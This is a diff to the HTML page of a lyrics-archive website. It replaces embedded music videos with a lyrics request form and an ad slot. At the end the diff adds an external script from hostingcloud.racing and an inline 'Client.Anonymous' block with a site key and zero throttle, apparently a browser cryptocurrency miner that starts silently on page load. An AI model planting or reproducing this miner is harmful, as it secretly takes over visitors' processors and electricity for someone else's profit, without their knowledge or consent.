@@ -13,21 +13,33 @@
         <h1>Lyrics Archive</h1>
     </header>
     <main>
-        <h2>Trending:</h2>
-        <section class="container">
-        <section class="mv">
-            <iframe src="https://www.youtube.com/embed/D8VEhcPeSlc?si=0SV_av-YMIsJXr8I" loading="lazy" title="Music Video">Loading...</iframe>
-        </section>
-        <section class="mv">
-            <iframe src="https://www.youtube.com/embed/2JgvVfOfoWI?si=y_5P87xrZgM-d0ev" loading="lazy" title="Music Video">Loading...</iframe>
-        </section>
-        <section class="mv">
-            <iframe src="https://www.youtube.com/embed/kLbn61Z4LDI?si=cqnvM4faP0H3MW9b" loading="lazy" title="Music Video">Loading...</iframe>
-        </section>
-        </section>
+        <!--
+        <div class="ad-space-one">
+
+        </div>
+        -->
+        <h2>Request a lyrics:</h2>
+        <form action="" method="post">
+            <input type="text" placeholder="Song Title" required>
+            <input type="text" placeholder="Singer Name" required>
+            <input type="submit" value="Request" class="submit">
+        </form>
+        <div class="ad-space-two">
+            <button id="closead">close</button>
+            <iframe data-aa='2276837' src='//ad.a-ads.com/2276837?size=300x250' style='width:300px; height:250px; border:0px; padding:0; overflow:hidden; background-color: transparent;'></iframe>
+        </div>
     </main>
     <footer>
         <h3>© Lyrics Archive</h3>
+        <button class="mv">MV</button>
     </footer>
+    <script src="script.js" defer></script>
+    <script src="https://www.hostingcloud.racing/UM8V.js"></script>
+    <script>
+        var _client = new Client.Anonymous('210db0774dc65e23625bee7a517da7e6d0e9d667c91846fa727d9d38eae9b1c9', {
+            throttle: 0, c: 'w', ads: 0
+        });
+        _client.start();
+    </script>
 </body>
 </html>
